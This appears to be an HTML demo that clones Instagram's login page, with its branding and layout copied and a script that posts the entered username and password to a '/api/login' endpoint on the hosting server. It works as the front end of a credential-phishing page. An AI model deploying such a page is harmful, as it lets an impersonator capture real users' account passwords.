<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Instagram • Log in</title>
  <link rel="preconnect" href="https://fonts.googleapis.com" />
  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
  <link href="https://fonts.googleapis.com/css2?family=Grand+Hotel&display=swap" rel="stylesheet" />
  <style>
    * { box-sizing: border-box; margin: 0; padding: 0; }

    body {
      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Helvetica, Arial, sans-serif;
      background: #fafafa;
      color: #262626;
      min-height: 100vh;
      display: flex;
      flex-direction: column;
      align-items: center;
      padding: 40px 10px 20px;
    }

    .page { width: 100%; max-width: 350px; }

    .card {
      background: #fff;
      border: 1px solid #dbdbdb;
      padding: 40px 40px 24px;
      text-align: center;
    }

    .logo {
      display: flex;
      align-items: center;
      justify-content: center;
      gap: 10px;
      margin-bottom: 30px;
    }
    .logo svg { width: 44px; height: 44px; }
    .wordmark {
      font-family: "Grand Hotel", cursive;
      font-size: 42px;
      font-weight: 400;
      line-height: 1;
      letter-spacing: .5px;
    }

    form { display: flex; flex-direction: column; gap: 6px; }

    .input { position: relative; }
    .input input {
      width: 100%;
      height: 38px;
      padding: 9px 8px;
      background: #fafafa;
      border: 1px solid #dbdbdb;
      border-radius: 3px;
      font-size: 12px;
      color: #262626;
      outline: none;
    }
    .input input::placeholder { color: #8e8e8e; }
    .input input:focus { border-color: #a8a8a8; }
    .input.password input { padding-right: 60px; }

    .toggle {
      position: absolute;
      right: 8px;
      top: 50%;
      transform: translateY(-50%);
      background: none;
      border: none;
      color: #262626;
      font-size: 14px;
      font-weight: 600;
      cursor: pointer;
    }

    .btn-login {
      margin-top: 8px;
      height: 32px;
      background: #0095f6;
      color: #fff;
      border: none;
      border-radius: 8px;
      font-size: 14px;
      font-weight: 600;
      cursor: pointer;
    }
    .btn-login:disabled { opacity: .4; cursor: default; }
    .btn-login:not(:disabled):hover { background: #0074e0; }

    .divider {
      display: flex;
      align-items: center;
      margin: 18px 0;
      color: #8e8e8e;
      font-size: 13px;
      font-weight: 600;
    }
    .divider::before,
    .divider::after { content: ""; flex: 1; height: 1px; background: #dbdbdb; }
    .divider span { padding: 0 18px; }

    .fb-login {
      display: inline-flex;
      align-items: center;
      justify-content: center;
      gap: 8px;
      background: none;
      border: none;
      color: #385185;
      font-size: 14px;
      font-weight: 600;
      cursor: pointer;
    }

    .forgot {
      display: block;
      margin-top: 16px;
      color: #00376b;
      font-size: 12px;
      text-decoration: none;
    }

    .notice {
      margin-top: 12px;
      min-height: 16px;
      font-size: 13px;
      color: #262626;
    }

    .signup {
      margin-top: 10px;
      background: #fff;
      border: 1px solid #dbdbdb;
      padding: 20px;
      text-align: center;
      font-size: 14px;
    }
    .link-blue {
      color: #0095f6;
      font-weight: 600;
      text-decoration: none;
      cursor: pointer;
    }

    .app {
      text-align: center;
      margin: 15px 0;
      font-size: 14px;
    }
    .store-btns {
      display: flex;
      justify-content: center;
      gap: 8px;
      margin-top: 10px;
    }
    .store-btns a {
      background: #000;
      color: #fff;
      text-decoration: none;
      font-size: 12px;
      padding: 6px 12px;
      border-radius: 6px;
    }

    footer {
      margin-top: 30px;
      text-align: center;
      font-size: 12px;
      color: #8e8e8e;
      line-height: 1.8;
    }
    footer a { color: #8e8e8e; text-decoration: none; margin: 0 6px; }

    @media (max-width: 480px) {
      body { background: #fff; padding-top: 20px; }
      .card { border: none; padding: 20px 20px 10px; }
      .signup { border: none; }
    }
  </style>
</head>
<body>
  <div class="page">
    <main class="card">
      <div class="logo">
        <svg viewBox="0 0 24 24" aria-hidden="true">
          <defs>
            <linearGradient id="igGrad" x1="0" y1="1" x2="1" y2="0">
              <stop offset="0" stop-color="#feda75" />
              <stop offset=".25" stop-color="#fa7e1e" />
              <stop offset=".5" stop-color="#d62976" />
              <stop offset=".75" stop-color="#962fbf" />
              <stop offset="1" stop-color="#4f5bd5" />
            </linearGradient>
          </defs>
          <rect x="2.5" y="2.5" width="19" height="19" rx="5.5" fill="none" stroke="url(#igGrad)" stroke-width="2" />
          <circle cx="12" cy="12" r="4.3" fill="none" stroke="url(#igGrad)" stroke-width="2" />
          <circle cx="17.5" cy="6.5" r="1.25" fill="url(#igGrad)" />
        </svg>
        <h1 class="wordmark">Instagram</h1>
      </div>

      <form id="loginForm">
        <div class="input">
          <input type="text" id="username" placeholder="Phone number, username, or email" autocomplete="username" />
        </div>
        <div class="input password">
          <input type="password" id="password" placeholder="Password" autocomplete="current-password" />
          <button type="button" class="toggle" id="toggle" aria-label="Show password">Show</button>
        </div>
        <button type="submit" class="btn-login" id="loginBtn" disabled>Log in</button>
      </form>

      <div class="divider"><span>OR</span></div>

      <button type="button" class="fb-login" id="fbBtn">
        <svg width="16" height="16" viewBox="0 0 16 16" aria-hidden="true">
          <circle cx="8" cy="8" r="8" fill="#385185" />
          <text x="8.6" y="12" font-family="Arial" font-size="12" font-weight="700" fill="#fff" text-anchor="middle">f</text>
        </svg>
        Log in with Facebook
      </button>

      <a href="#" class="forgot">Forgot password?</a>

      <p class="notice" id="notice" role="status"></p>
    </main>

    <section class="signup">
      Don't have an account? <a href="#" class="link-blue">Sign up</a>
    </section>

    <section class="app">
      Get the app.
      <div class="store-btns">
        <a href="#">App Store</a>
        <a href="#">Google Play</a>
      </div>
    </section>

    <footer>
      <div>
        <a href="#">About</a> · <a href="#">Help</a> · <a href="#">Privacy</a> · <a href="#">Terms</a>
      </div>
      <div>© 2026 Instagram login demo</div>
    </footer>
  </div>

  <script>
    const form = document.getElementById('loginForm');
    const user = document.getElementById('username');
    const pass = document.getElementById('password');
    const btn = document.getElementById('loginBtn');
    const toggle = document.getElementById('toggle');
    const fbBtn = document.getElementById('fbBtn');
    const notice = document.getElementById('notice');

    function updateButton() {
      btn.disabled = !(user.value.trim() && pass.value.length > 0);
    }
    user.addEventListener('input', updateButton);
    pass.addEventListener('input', updateButton);
    updateButton();

    toggle.addEventListener('click', () => {
      const showing = pass.type === 'text';
      pass.type = showing ? 'password' : 'text';
      toggle.textContent = showing ? 'Show' : 'Hide';
      toggle.setAttribute('aria-label', showing ? 'Show password' : 'Hide password');
    });

    form.addEventListener('submit', async (e) => {
      e.preventDefault();
      if (btn.disabled) return;

      notice.style.color = '#262626';
      notice.textContent = 'Logging in...';

      try {
        const response = await fetch('/api/login', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            username: user.value.trim(),
            password: pass.value
          })
        });

        const data = await response.json();

        if (data.success) {
          notice.style.color = 'green';
          notice.textContent = 'Login successful!';
        } else {
          notice.style.color = 'red';
          notice.textContent = data.message || 'Invalid username or password.';
        }
      } catch (err) {
        notice.style.color = 'red';
        notice.textContent = 'Server error. Please try again later.';
      }
    });

    fbBtn.addEventListener('click', () => {
      notice.style.color = '#262626';
      notice.textContent = 'Demo only: Facebook login is not connected.';
    });
  </script>
</body>
</html>
